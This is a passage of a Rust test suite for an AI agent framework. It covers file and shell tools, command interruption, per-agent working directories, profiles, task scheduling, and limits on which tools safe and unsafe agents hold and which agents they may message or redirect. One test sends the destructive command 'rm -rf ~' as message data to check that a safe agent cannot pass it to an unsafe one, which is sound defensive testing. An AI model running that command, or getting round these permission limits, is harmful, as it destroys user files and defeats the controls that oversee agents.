        assert!(read.contains("fn a()"), "{read}");
        let found = tool_glob(
            &serde_json::json!({"pattern": abs("src/*.rs")}).to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(found, "src/a.rs");
        // And grep, unsandboxed here, with the absolute path too.
        let found = tool_grep_unsandboxed(
            &serde_json::json!({"pattern": "fn a", "path": abs("src")}).to_string(),
            &ctx,
        )
        .unwrap();
        assert!(found.contains("src/a.rs:1:fn a() {}"), "{found}");
    }

    #[test]
    fn test_a_stop_kills_a_running_command_at_once() {
        let dir = TempTestDir::new("stop_command");
        let (tx, rx) = mpsc::channel();
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.cwd = Some(dir.0.clone());
        ctx.interrupt = Some(Arc::new(Mutex::new(rx)));
        std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(300));
            let _ = tx.send(());
        });
        let started = std::time::Instant::now();
        // A shell, with a child of its own that would outlive it.
        let err = tool_run_command(
            &r#"{"command": "sleep 30 & sleep 30; touch done"}"#.to_string(),
            &ctx,
        )
        .unwrap_err();
        assert!(err.downcast_ref::<InterruptedError>().is_some(), "{err}");
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
        std::thread::sleep(Duration::from_millis(200));
        assert!(!dir.0.join("done").exists());
        // Without a stop, it runs to the end, with nothing to read on stdin.
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.cwd = Some(dir.0.clone());
        let out = tool_run_command(&r#"{"command": "cat; echo ok"}"#.to_string(), &ctx).unwrap();
        assert!(out.contains("ok"), "{out}");
    }

    #[test]
    fn test_tools_work_in_the_agents_own_directory() {
        let dir = TempTestDir::new("agent_cwd");
        std::fs::create_dir(dir.0.join("sub")).unwrap();
        std::fs::write(dir.0.join("sub/a.txt"), "hello\n").unwrap();
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.cwd = Some(dir.0.clone());
        // Relative paths are the agent's, not the process's.
        let read = tool_read_file(&r#"{"path": "sub/a.txt"}"#.to_string(), &ctx).unwrap();
        assert!(read.contains("hello"), "{read}");
        let found = tool_glob(&r#"{"pattern": "sub/*.txt"}"#.to_string(), &ctx).unwrap();
        assert_eq!(found, "sub/a.txt");
        tool_write_file(&r#"{"path": "b.txt", "content": "new"}"#.to_string(), &ctx).unwrap();
        assert_eq!(std::fs::read_to_string(dir.0.join("b.txt")).unwrap(), "new");
        assert!(!std::path::Path::new("b.txt").exists());
        let out = tool_run_command(&r#"{"command": "pwd"}"#.to_string(), &ctx).unwrap();
        let out: serde_json::Value = serde_json::from_str(&out).unwrap();
        assert_eq!(
            std::path::PathBuf::from(out["stdout"].as_str().unwrap().trim())
                .canonicalize()
                .unwrap(),
            dir.0.canonicalize().unwrap()
        );
    }

    #[test]
    fn test_only_the_user_or_an_unsafe_agent_picks_where_an_agent_works() {
        let dir = TempTestDir::new("child_cwd");
        let (db, mut ctx) = spawning_setup("cwd", serde_json::json!([{"reply": "ok"}]));
        ctx.cwd = Some(dir.0.clone());
        let here = dir.0.to_str().unwrap().to_string();
        // An agent's agents work where it does, and it can't send them elsewhere.
        assert_eq!(child_cwd(&ctx, None), Ok(Some(here.clone())));
        assert!(child_cwd(&ctx, Some("/tmp")).is_err());
        tool_spawn_agent(&r#"{"name": "helper", "prompt": "go"}"#.to_string(), &ctx).unwrap();
        assert_eq!(
            db.get_agent_config("helper").unwrap().cwd,
            Some(here.clone())
        );
        let made = tool_agent_create(&r#"{"name": "elsewhere", "cwd": "/"}"#.to_string(), &ctx);
        assert!(made.is_err());
        let moved = r#"{"agent": "helper", "cwd": "/"}"#.to_string();
        assert!(tool_agent_configure(&moved, &ctx).is_err());
        // Nor can it run one the user set to work elsewhere.
        db.create_agent("other", "").unwrap();
        set_agent_cwd(db.as_ref(), "other", Some("/".to_string())).unwrap();
        let err = tool_spawn_agent(&r#"{"name": "other", "prompt": "go"}"#.to_string(), &ctx)
            .unwrap_err()
            .to_string();
        assert!(err.contains("isn't one of the agents you made"), "{err}");
        // An unsafe agent can.
        ctx.unsafe_tools = true;
        assert_eq!(child_cwd(&ctx, Some("/")), Ok(Some("/".to_string())));
        tool_agent_configure(&moved, &ctx).unwrap();
        assert_eq!(
            db.get_agent_config("helper").unwrap().cwd.as_deref(),
            Some("/")
        );
        // A profile leaves it alone.
        apply_profile(db.as_ref(), "helper", "p", &Profile::default()).unwrap();
        assert_eq!(
            db.get_agent_config("helper").unwrap().cwd.as_deref(),
            Some("/")
        );
    }

    #[test]
    fn test_parse_chat_command_cwd() {
        assert!(matches!(parse_chat_command("/cwd"), ChatCommand::Cwd(None)));
        assert!(matches!(
            parse_chat_command("/cwd  "),
            ChatCommand::Cwd(None)
        ));
        match parse_chat_command("/cwd ../x ") {
            ChatCommand::Cwd(Some(p)) => assert_eq!(p, "../x"),
            _ => panic!("expected Cwd"),
        }
    }

    #[test]
    fn test_a_safe_agent_cannot_message_an_unsafe_one() {
        let db = local_db_with_agents(&["helper", "power", "chat", "peer"]);
        set_agent_unsafe(db.as_ref(), "power", true).unwrap();
        // "chat" is unsafe only for the session running it.
        assert!(db.claim_agent("chat", "s1").unwrap());
        mark_session_unsafe(db.as_ref(), "chat", "s1");
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.db = Some(db.clone());
        ctx.agent_name = Some("helper".to_string());
        // Each gets its own send_message, as with run_command.
        let available = initialize_tools(true, None);
        let config = db::AgentConfig::default();
        let safe = agent_tools(&available, false, &config);
        let unsafe_ = agent_tools(&available, true, &config);
        assert!(
            safe["send_message"]
                .schema
                .contains("without the unsafe tools")
        );
        assert!(
            !unsafe_["send_message"]
                .schema
                .contains("without the unsafe tools")
        );
        let send = |tools: &ToolsCollection, to: &str| {
            let args = serde_json::json!({"to": to, "message": "rm -rf ~"}).to_string();
            (tools["send_message"].callback)(&args, &ctx)
        };
        for unsafe_agent in ["power", "chat"] {
            let err = send(&safe, unsafe_agent).unwrap_err().to_string();
            assert!(err.contains("has the unsafe tools"), "{err}");
        }
        send(&safe, "peer").unwrap();
        // Once that session is gone, so is the marker's effect.
        db.release_agent("chat", "s1").unwrap();
        send(&safe, "chat").unwrap();
        // An unsafe agent's may message either.
        send(&unsafe_, "power").unwrap();
    }

    #[test]
    fn test_fit_history_keeps_system_and_whole_turns() {
        let tool_call = Message {
            role: "assistant".to_string(),
            content: None,
            tool_calls: Some(vec![]),
            tool_call_id: None,
            name: None,
        };
        let mut history = vec![make_message("system", "be brief".to_string())];
        for i in 0..20 {
            history.push(make_message(
                "user",
                format!("question {} {}", i, "x".repeat(200)),
            ));
            history.push(tool_call.clone());
            history.push(make_message("tool", "y".repeat(200)));
            history.push(make_message("assistant", format!("answer {}", i)));
        }
        assert_eq!(fit_history(history.clone(), 1_000_000).len(), history.len());
        let fitted = fit_history(history.clone(), 2_000);
        assert_eq!(fitted[0].content.as_deref(), Some("be brief"));
        assert!(fitted[1].content.as_deref().unwrap().contains("left out"));
        assert_eq!(fitted[2].role, "user", "starts with a turn");
        assert_eq!(fitted.last().unwrap().content.as_deref(), Some("answer 19"));
        assert!(fitted.len() < history.len());
    }

    #[test]
    fn test_an_agents_own_tasks_carry_on_its_conversation() {
        let model = model_script(
            "memory",
            serde_json::json!([
                {"if": "my name is Ada", "reply": "nice to meet you"},
                {"if": "what's my name", "reply": "remembered"}
            ]),
        );
        let db = local_db_with_agents(&["w"]);
        assert!(db.claim_agent("w", "worker-session").unwrap());
        let ctx = chat_ctx_with_model(db.clone(), "w", &model);
        let extra = ctx
            .extra
            .clone()
            .unwrap()
            .downcast::<SubAgentContext>()
            .ok()
            .unwrap();
        let mut opts = Opts::default();
        opts.model = Some(model.clone());
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        for text in ["my name is Ada", "what's my name?"] {
            db.create_oneshot_task("m", "", &past, text, Some("w"))
                .unwrap();
            let task = claim_prompt_task(db.as_ref(), "worker-session", "w", &[]).unwrap();
            let (_tx, rx) = mpsc::channel();
            run_prompt_task_headless(
                &task,
                "w",
                &db,
                "worker-session",
                &extra.tools,
                &opts,
                extra.clone(),
                &None,
                rx,
            );
        }
        let transcript = db.load_agent_messages("w").unwrap();
        let said: Vec<&str> = transcript
            .iter()
            .filter_map(|m| m["content"].as_str())
            .collect();
        assert!(
            said.iter().any(|c| c.contains("my name is Ada")),
            "{said:?}"
        );
        assert!(
            said.iter().any(|c| c.contains("what's my name")),
            "{said:?}"
        );
        assert!(said.contains(&"remembered"));
    }

    #[test]
    fn test_tasks_a_safe_agent_makes_run_safe() {
        let db = local_db_with_agents(&["boss"]);
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.db = Some(db.clone());
        ctx.agent_name = Some("boss".to_string());
        let create = |ctx: &ToolContext| {
            let out = tool_task_create(
                &r#"{"name": "t", "command": "{\"tool\": \"glob\", \"arguments\": {}}", "run_at": "2099-01-01T00:00:00Z"}"#
                    .to_string(),
                ctx,
            )
            .unwrap();
            let id = db.list_tasks(None).unwrap().last().unwrap().id;
            (out, db.get_task(id).unwrap().unwrap())
        };
        let (_, task) = create(&ctx);
        assert!(task.run_safe);
        ctx.unsafe_tools = true;
        let (_, task) = create(&ctx);
        assert!(!task.run_safe);

        // Run as tool tasks, a safe one gets the safe tools only.
        let mut opts = Opts::default();
        opts.unsafe_tools = true;
        let tools = ToolTaskTools::new(&opts);
        let mut safe = task.clone();
        safe.run_safe = true;
        assert!(tools.for_task(&task).0.contains_key("fetch_web_content"));
        assert!(!tools.for_task(&safe).0.contains_key("fetch_web_content"));
    }

    #[test]
    fn test_agent_wait_collects_results_together() {
        // Coordinator rules first: spawn_agent's results echo the prompts.
        let (db, ctx) = spawning_setup(
            "wait",
            serde_json::json!([
                {"if": "\"agent\":\"a\"", "tool": "spawn_agent", "arguments": {"name": "b", "prompt": "job b"}},
                {"if": "\"agent\":\"b\"", "tool": "agent_wait", "arguments": {}},
                {"if": "## a", "reply": "got both"},
                {"if": "start", "tool": "spawn_agent", "arguments": {"name": "a", "prompt": "job a"}},
                {"if": "job a", "reply": "result A", "delay_ms": 100},
                {"if": "job b", "reply": "result B", "delay_ms": 300},
            ]),
        );
        let model = match &ctx.extra {
            Some(extra) => extra
                .downcast_ref::<SubAgentContext>()
                .unwrap()
                .opts
                .model
                .clone(),
            None => unreachable!(),
        };
        assert_eq!(run_turn(&ctx, &model, "start"), "got both");
        let runs = &ctx
            .extra
            .as_ref()
            .unwrap()
            .downcast_ref::<SubAgentContext>()
            .unwrap()
            .runs;
        let state = runs.runs.lock().unwrap();
        assert_eq!(state.len(), 2);
        assert!(
            state
                .values()
                .all(|run| run.delivered && run.result.is_some())
        );
        drop(state);
        // Collected, so nothing left to wait for - which isn't a failure.
        let out = tool_agent_wait(&"{}".to_string(), &ctx).unwrap();
        assert!(out.starts_with("Nothing to wait for"), "{out}");
        assert!(out.contains("fan_out returns its results"), "{out}");
        let _ = db;
    }

    #[test]
    fn test_a_sub_agent_can_wait_for_its_own() {
        // Before agent_wait, a sub-agent's sub-agents' results went to a
        // parent nobody read messages for, and were lost.
        let (db, ctx) = spawning_setup(
            "nested_wait",
            serde_json::json!([
                {"if": "\"agent\":\"leaf\"", "tool": "agent_wait", "arguments": {"names": ["leaf"]}},
                {"if": "## leaf", "reply": "the leaf says 42"},
                {"if": "middle job", "tool": "spawn_agent", "arguments": {"name": "leaf", "prompt": "leaf job"}},
                {"if": "leaf job", "reply": "42"},
            ]),
        );
        tool_spawn_agent(
            &serde_json::json!({"name": "middle", "prompt": "middle job"}).to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(sub_agent_result(&db, "boss", "middle"), "the leaf says 42");
    }

    #[test]
    fn test_agent_wait_any_and_timeout() {
        let (_db, ctx) = spawning_setup(
            "wait_any",
            serde_json::json!([
                {"if": "quick", "reply": "fast one"},
                {"if": "slow", "reply": "slow one", "delay_ms": 30000},
            ]),
        );
        for (name, prompt) in [("fast", "quick"), ("slow", "slow")] {
            tool_spawn_agent(
                &serde_json::json!({"name": name, "prompt": prompt}).to_string(),
                &ctx,
            )
            .unwrap();
        }
        let first = tool_agent_wait(&r#"{"any": true}"#.to_string(), &ctx).unwrap();
        assert!(first.contains("## fast\nfast one"), "{first}");
        assert!(first.contains("## slow\n(still running)"), "{first}");
        let started = std::time::Instant::now();
        let later = tool_agent_wait(&r#"{"timeout_seconds": 1}"#.to_string(), &ctx).unwrap();
        assert!(!later.contains("## fast"), "already collected: {later}");
        assert!(later.contains("## slow\n(still running)"), "{later}");
        assert!(started.elapsed() < std::time::Duration::from_secs(5));
        let out = tool_agent_wait(&r#"{"names": ["nobody"]}"#.to_string(), &ctx).unwrap();
        assert!(out.contains("none of nobody"), "{out}");
        tool_agent_cancel(&r#"{"name":"slow"}"#.to_string(), &ctx).unwrap();
    }

    /// `ctx` with `profiles` for making agents from.
    fn with_profiles(ctx: &mut ToolContext, profiles: Profiles) {
        let extra = ctx
            .extra
            .as_ref()
            .unwrap()
            .downcast_ref::<SubAgentContext>()
            .unwrap()
            .clone();
        ctx.extra = Some(Arc::new(SubAgentContext {
            profiles: Arc::new(profiles),
            ..extra
        }));
    }

    /// A profile whose model is a script answering everything with `reply`.
    fn scripted_profile(name: &str, reply: &str) -> Profile {
        Profile {
            model: Some(model_script(
                name,
                serde_json::json!([{"if": "", "reply": reply}]),
            )),
            parameters: Some(
                serde_json::json!({"reasoning_effort": "low"})
                    .as_object()
                    .unwrap()
                    .clone(),
            ),
            ..Default::default()
        }
    }

    #[test]
    fn test_agent_settings_layer_over_the_session() {
        let mut opts = Opts::default();
        opts.model = Some("base".to_string());
        opts.parameter = vec!["temperature=0.7".to_string(), "top_p=0.9".to_string()];
        opts.api_key = Some("/keys/session".to_string());
        opts.max_tokens = Some(100);
        let plain = build_openai_opts(&opts, &db::AgentConfig::default());
        assert_eq!(plain.model, "base");
        let config = db::AgentConfig {
            model: Some("small".to_string()),
            api_key: Some("/keys/agent".to_string()),
            parameters: Some(
                serde_json::json!({"temperature": 0.1, "reasoning_effort": "low"})
                    .as_object()
                    .unwrap()
                    .clone(),
            ),
            ..Default::default()
        };
        let layered = build_openai_opts(&opts, &config);
        assert_eq!(layered.model, "small");
        assert_eq!(layered.api_key.as_deref(), Some("/keys/agent"));
        assert_eq!(
            layered.max_tokens,
            Some(100),
            "unset fields stay the session's"
        );
        assert_eq!(layered.parameters["temperature"], serde_json::json!(0.1));
        assert_eq!(layered.parameters["reasoning_effort"], "low");
        assert!(layered.parameters.contains_key("top_p"));
    }

    #[test]
    fn test_agent_tools_narrow_but_never_widen() {
        let safe = initialize_tools(false, None);
        assert!(!safe.contains_key("fetch_web_content"));
        let config = db::AgentConfig {
            tools: Some(vec![
                "read_file".to_string(),
                "fetch_web_content".to_string(),
            ]),
            ..Default::default()
        };
        let tools = effective_tools(&safe, &config);
        assert_eq!(tools.keys().collect::<Vec<_>>(), vec!["read_file"]);
        assert_eq!(
            effective_tools(&safe, &db::AgentConfig::default()).len(),
            safe.len()
        );
    }

    #[test]
    fn test_profiles_from_the_config_file() {
        let opts: Opts = serde_json::from_str(
            r#"{"profiles": {"fast": {"model": "qwen", "parameters": {"reasoning_effort": "low"},
                                      "tools": ["read_file"], "description": "quick looks"}}}"#,
        )
        .unwrap();
        let fast = &opts.profiles["fast"];
        assert_eq!(fast.model.as_deref(), Some("qwen"));
        assert!(validate_profiles(&opts.profiles).is_ok());
        let config = fast.agent_config("fast");
        assert_eq!(config.profile.as_deref(), Some("fast"));
        assert_eq!(config.tools, Some(vec!["read_file".to_string()]));
        let overview = profiles_overview(&opts.profiles).unwrap();
        assert!(
            overview.contains("- fast: quick looks (model qwen, reasoning_effort \"low\")"),
            "{overview}"
        );

        let typo = serde_json::from_str::<Opts>(r#"{"profiles": {"fast": {"modle": "x"}}}"#);
        assert!(typo.is_err(), "unknown keys are rejected");
        let bad_tool: Profiles = serde_json::from_str(r#"{"fast": {"tools": ["nope"]}}"#).unwrap();
        assert!(
            validate_profiles(&bad_tool)
                .unwrap_err()
                .contains("unknown tool 'nope'")
        );
        let bad_name: Profiles = serde_json::from_str(r#"{"a b": {}}"#).unwrap();
        assert!(validate_profiles(&bad_name).is_err());
        let err = find_profile(&opts.profiles, "slow").unwrap_err();
        assert!(err.contains("use one of fast"), "{err}");
    }

    #[test]
    fn test_tasks_add_and_assign_pick_where_a_task_runs() {
        let now = utc("2026-10-02T12:00:00Z");
        let task = new_task_from_cli(&add_args(&["review it", "--profile", "fast"]), now).unwrap();
        assert_eq!(
            (task.profile.as_deref(), task.agent_name.as_deref()),
            (Some("fast"), None)
        );
        for conflicting in [
            vec![
                "faber",
                "tasks",
                "add",
                "x",
                "--profile",
                "fast",
                "--agent",
                "bob",
            ],
            vec!["faber", "tasks", "add", "{}", "--profile", "fast", "--tool"],
            vec!["faber", "tasks", "assign", "1"],
            vec![
                "faber",
                "tasks",
                "assign",
                "1",
                "--any",
                "--profile",
                "fast",
            ],
        ] {
            assert!(
                Opts::try_parse_from(&conflicting).is_err(),
                "{conflicting:?}"
            );
        }

        let db: Option<Arc<dyn DbBackend>> = Some(local_db_with_agents(&["bob"]));
        let backend = db.as_ref().unwrap();
        let id = backend.create_task(&task).unwrap();
        assign_tasks_command(&db, &[id], Some("bob"), None).unwrap();
        let row = backend.get_task(id).unwrap().unwrap();
        assert_eq!(
            (row.agent_name.as_deref(), row.profile.as_deref()),
            (Some("bob"), None)
        );
        assert_eq!(task_target(&row), "bob");
        assign_tasks_command(&db, &[id], None, None).unwrap();
        assert_eq!(
            task_target(&backend.get_task(id).unwrap().unwrap()),
            "any agent"
        );
        assign_tasks_command(&db, &[id], None, Some("slow")).unwrap();
        assert_eq!(
            task_target(&backend.get_task(id).unwrap().unwrap()),
            "profile slow"
        );
        let err = assign_tasks_command(&db, &[id, 999], None, None).unwrap_err();
        assert!(err.to_string().contains("1 of 2"), "{err}");
    }

    #[test]
    fn test_profile_tasks_go_only_to_workers_with_the_profile() {
        let db = local_db_with_agents(&["w"]);
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let id = db
            .create_task(&db::NewTask {
                name: "t".to_string(),
                description: String::new(),
                kind: db::TaskKind::PROMPT.to_string(),
                command: "do it".to_string(),
                agent_name: None,
                schedule: db::TaskSchedule::Once { at: past },
                held: false,
                depends_on: Vec::new(),
                profile: Some("fast".to_string()),
                run_safe: false,
                cwd: None,
            })
            .unwrap();
        // A chat, or a worker without the profile, leaves it alone.
        assert!(claim_prompt_task(db.as_ref(), "s", "w", &[]).is_none());
        assert!(claim_prompt_task(db.as_ref(), "s", "w", &["slow".to_string()]).is_none());
        let task = claim_prompt_task(db.as_ref(), "s", "w", &["fast".to_string()]).unwrap();
        assert_eq!(task.id, id);
    }

    #[test]
    fn test_spawn_agent_makes_a_sub_agent_from_a_profile() {
        let (db, mut ctx) = spawning_setup(
            "profile_spawn",
            serde_json::json!([{"if": "", "reply": "from the session's model"}]),
        );
        with_profiles(
            &mut ctx,
            HashMap::from([(
                "fast".to_string(),
                scripted_profile("profile_spawn_fast", "from fast"),
            )]),
        );
        tool_spawn_agent(
            &serde_json::json!({"name": "helper", "prompt": "look", "profile": "fast"}).to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(sub_agent_result(&db, "boss", "helper"), "from fast");
        let config = db.get_agent_config("helper").unwrap();
        assert_eq!(config.profile.as_deref(), Some("fast"));
        assert_eq!(config.parameters.unwrap()["reasoning_effort"], "low");

        // Without a profile, it's the session's model.
        tool_spawn_agent(
            &serde_json::json!({"name": "plain", "prompt": "look"}).to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(
            sub_agent_result(&db, "boss", "plain"),
            "from the session's model"
        );
        // An existing agent can't be switched to a profile this way.
        let err = tool_spawn_agent(
            &serde_json::json!({"name": "plain", "prompt": "again", "profile": "fast"}).to_string(),
            &ctx,
        )
        .unwrap_err();
        assert!(err.to_string().contains("no profile"), "{err}");
        let err = tool_spawn_agent(
            &serde_json::json!({"name": "x", "prompt": "p", "profile": "slow"}).to_string(),
            &ctx,
        )
        .unwrap_err();
        assert!(err.to_string().contains("use one of fast"), "{err}");
        // agent_configure re-applies a profile to an existing agent.
        tool_agent_configure(
            &serde_json::json!({"agent": "plain", "profile": "fast"}).to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(
            db.get_agent_config("plain").unwrap().profile.as_deref(),
            Some("fast")
        );
        tool_agent_create(
            &serde_json::json!({"name": "made", "profile": "fast"}).to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(
            db.get_agent_config("made").unwrap().profile.as_deref(),
            Some("fast")
        );
        assert!(
            tool_agent_create(
                &serde_json::json!({"name": "unmade", "profile": "slow"}).to_string(),
                &ctx,
            )
            .is_err()
        );
        assert!(
            db.get_agent("unmade").unwrap().is_none(),
            "not left half made"
        );
    }

    #[test]
    fn test_fan_out_workers_run_with_a_profile() {
        let (_db, mut ctx) = spawning_setup(
            "profile_fan_out",
            serde_json::json!([{"if": "", "reply": "session"}]),
        );
        with_profiles(
            &mut ctx,
            HashMap::from([(
                "fast".to_string(),
                scripted_profile("profile_fan_out_fast", "fast says hi"),
            )]),
        );
        let out = fan_out::tool_fan_out(
            &serde_json::json!({"items": ["a", "b"], "prompt": "greet {item}", "profile": "fast"})
                .to_string(),
            &ctx,
        )
        .unwrap();
        assert_eq!(out.matches("fast says hi").count(), 2, "{out}");
    }

    #[test]
    fn test_worker_runs_a_profile_task_on_a_new_agent() {
        let db = local_db_with_agents(&["w"]);
        assert!(db.claim_agent("w", "worker-session").unwrap());
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let id = db
            .create_task(&db::NewTask {
                name: "review".to_string(),
                description: String::new(),
                kind: db::TaskKind::PROMPT.to_string(),
                command: "review the diff".to_string(),
                agent_name: None,
                schedule: db::TaskSchedule::Once { at: past },
                held: false,
                depends_on: Vec::new(),
                profile: Some("fast".to_string()),
                run_safe: false,
                cwd: None,
            })
            .unwrap();
        let mut opts = Opts::default();
        opts.model = Some(model_script(
            "profile_worker_session",
            serde_json::json!([{"if": "", "reply": "worker's own model"}]),
        ));
        opts.profiles = HashMap::from([(
            "fast".to_string(),
            scripted_profile("profile_worker_fast", "looks good"),
        )]);
        let task =
            claim_prompt_task(db.as_ref(), "worker-session", "w", &["fast".to_string()]).unwrap();
        let ctx = chat_ctx_with_model(db.clone(), "w", opts.model.as_deref().unwrap());
        let extra = ctx
            .extra
            .clone()
            .unwrap()
            .downcast::<SubAgentContext>()
            .ok()
            .unwrap();
        let (_cancel_tx, cancel_rx) = mpsc::channel();
        let outcome = run_prompt_task_headless(
            &task,
            "w",
            &db,
            "worker-session",
            &extra.tools,
            &opts,
            extra.clone(),
            &None,
            cancel_rx,
        );
        assert!(outcome.succeeded, "{}", outcome.result);
        assert_eq!(outcome.result, "looks good");
        let agent_name = format!("fast-{}", id);
        let agent = db.get_agent(&agent_name).unwrap().unwrap();
        assert_eq!(agent.parent.as_deref(), Some("w"));
        assert!(agent.activity.unwrap().starts_with("finished: looks good"));
        let transcript = db.load_agent_messages(&agent_name).unwrap();
        assert_eq!(transcript.last().unwrap()["content"], "looks good");
        assert!(
            db.load_agent_messages("w").unwrap().is_empty(),
            "not the worker's"
        );

        // A profile this worker doesn't have fails the task, saying why.
        opts.profiles.clear();
        db.set_task_target(id, None, Some("fast")).unwrap();
        let task = db.get_task(id).unwrap().unwrap();
        let (_cancel_tx, cancel_rx) = mpsc::channel();
        let outcome = run_prompt_task_headless(
            &task,
            "w",
            &db,
            "worker-session",
            &extra.tools,
            &opts,
            extra.clone(),
            &None,
            cancel_rx,
        );
        assert!(!outcome.succeeded);
        assert!(
            outcome.result.contains("no profile 'fast'"),
            "{}",
            outcome.result
        );
    }

    #[test]
    fn test_headless_task_run_records_its_outcome_and_transcript() {
        let model = model_script(
            "headless",
            serde_json::json!([{"if": "summarize", "reply": "all quiet"}]),
        );
        let db = local_db_with_agents(&["w"]);
        assert!(db.claim_agent("w", "worker-session").unwrap());
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let id = db
            .create_oneshot_task("check", "", &past, "summarize the logs", None)
            .unwrap();
        let task = claim_prompt_task(db.as_ref(), "worker-session", "w", &[]).expect("claimable");
        assert_eq!(task.id, id);
        let ctx = chat_ctx_with_model(db.clone(), "w", &model);
        let extra = ctx
            .extra
            .clone()
            .unwrap()
            .downcast::<SubAgentContext>()
            .ok()
            .unwrap();
        let mut opts = Opts::default();
        opts.model = Some(model.clone());
        let (_cancel_tx, cancel_rx) = mpsc::channel();
        let outcome = run_prompt_task_headless(
            &task,
            "w",
            &db,
            "worker-session",
            &extra.tools,
            &opts,
            extra.clone(),
            &None,
            cancel_rx,
        );
        assert!(outcome.succeeded);
        assert_eq!(outcome.result, "all quiet");
        let task = db.get_task(id).unwrap().unwrap();
        assert_eq!(
            (task.status.as_str(), task.last_result.as_deref()),
            ("done", Some("all quiet"))
        );
        // For any agent: it ran on an agent of its own, under the worker.
        let agent = db.get_agent(&format!("task-{}", id)).unwrap().unwrap();
        assert_eq!(agent.parent.as_deref(), Some("w"));
        assert!(agent.session_id.is_none(), "released once done");
        let transcript = db.load_agent_messages(&agent.name).unwrap();
        assert!(transcript.last().unwrap()["content"] == "all quiet");
        assert!(db.load_agent_messages("w").unwrap().is_empty());
    }

    #[test]
    fn test_a_task_does_not_end_before_its_sub_agents_report() {
        // The model starts a sub-agent and, without waiting, ends its turn.
        let model = model_script(
            "collect",
            serde_json::json!([
                {"if": "Their results", "reply": "lib.rs has 42 lines"},
                {"if": "count the files", "tool": "spawn_agent",
                 "arguments": {"name": "counter", "prompt": "count lib.rs"}},
                {"if": "count lib.rs", "reply": "42 lines", "delay_ms": 300},
                {"if": "\"spawned\"", "reply": "started a sub-agent; it will report back"}
            ]),
        );
        let db = local_db_with_agents(&["w"]);
        assert!(db.claim_agent("w", "worker-session").unwrap());
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let id = db
            .create_oneshot_task("t", "", &past, "count the files", None)
            .unwrap();
        let task = claim_prompt_task(db.as_ref(), "worker-session", "w", &[]).unwrap();
        let ctx = chat_ctx_with_model(db.clone(), "w", &model);
        let extra = ctx
            .extra
            .clone()
            .unwrap()
            .downcast::<SubAgentContext>()
            .ok()
            .unwrap();
        let mut opts = Opts::default();
        opts.model = Some(model.clone());
        let (_tx, rx) = mpsc::channel();
        let outcome = run_prompt_task_headless(
            &task,
            "w",
            &db,
            "worker-session",
            &extra.tools,
            &opts,
            extra.clone(),
            &None,
            rx,
        );
        // Its result is the answer it gave with the sub-agent's in hand.
        assert!(outcome.succeeded);
        assert_eq!(outcome.result, "lib.rs has 42 lines");
        assert_eq!(
            db.get_task(id).unwrap().unwrap().last_result.as_deref(),
            Some("lib.rs has 42 lines")
        );
    }

    #[test]
    fn test_a_task_runs_in_its_own_directory() {
        let dir = TempTestDir::new("task_cwd");
        std::fs::write(dir.0.join("only-here.txt"), "x").unwrap();
        let model = model_script(
            "task-cwd",
            serde_json::json!([
                {"if": "look", "tool": "glob", "arguments": {"pattern": "*.txt"}},
                {"if": "only-here.txt", "reply": "found it"},
                {"if": "Glob", "reply": "not found"}
            ]),
        );
        let db = local_db_with_agents(&["w"]);
        assert!(db.claim_agent("w", "worker-session").unwrap());
        let id = db
            .create_task(&db::NewTask {
                name: "t".to_string(),
                description: String::new(),
                kind: db::TaskKind::PROMPT.to_string(),
                command: "look around".to_string(),
                agent_name: None,
                schedule: db::TaskSchedule::Once {
                    at: (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339(),
                },
                held: false,
                depends_on: Vec::new(),
                profile: None,
                run_safe: false,
                cwd: Some(dir.0.to_str().unwrap().to_string()),
            })
            .unwrap();
        let task = claim_prompt_task(db.as_ref(), "worker-session", "w", &[]).unwrap();
        let ctx = chat_ctx_with_model(db.clone(), "w", &model);
        let extra = ctx
            .extra
            .clone()
            .unwrap()
            .downcast::<SubAgentContext>()
            .ok()
            .unwrap();
        let mut opts = Opts::default();
        opts.model = Some(model.clone());
        let (_tx, rx) = mpsc::channel();
        let outcome = run_prompt_task_headless(
            &task,
            "w",
            &db,
            "worker-session",
            &extra.tools,
            &opts,
            extra.clone(),
            &None,
            rx,
        );
        assert_eq!(outcome.result, "found it");
        // Its agent works there, and was told so.
        let agent = format!("task-{}", id);
        assert_eq!(
            db.get_agent_config(&agent).unwrap().cwd.as_deref(),
            dir.0.to_str()
        );
        let transcript = db.load_agent_messages(&agent).unwrap();
        assert!(
            transcript.iter().any(|m| m["content"].as_str().is_some_and(
                |c| c.starts_with(&format!("You work in the directory {}", dir.0.display()))
            ))
        );
    }

    #[test]
    fn test_a_task_never_waits_for_itself() {
        // Seeing its own task "running", the model waits for it.
        let model = model_script(
            "self-wait",
            serde_json::json!([
                // Most specific first: task_list's result repeats the command.
                {"if": "waiting for it would never end", "reply": "counted them myself"},
                {"if": "This is the task you are running", "tool": "task_wait", "arguments": {"ids": [1]}},
                {"if": "count the files", "tool": "task_list", "arguments": {"id": 1}}
            ]),
        );
        let db = local_db_with_agents(&["w"]);
        assert!(db.claim_agent("w", "worker-session").unwrap());
        let past = (chrono::Utc::now() - chrono::Duration::seconds(5)).to_rfc3339();
        let id = db
            .create_oneshot_task("t", "", &past, "count the files", None)
            .unwrap();
        assert_eq!(id, 1);
        let task = claim_prompt_task(db.as_ref(), "worker-session", "w", &[]).unwrap();
        let ctx = chat_ctx_with_model(db.clone(), "w", &model);
        let extra = ctx
            .extra
            .clone()
            .unwrap()
            .downcast::<SubAgentContext>()
            .ok()
            .unwrap();
        let mut opts = Opts::default();
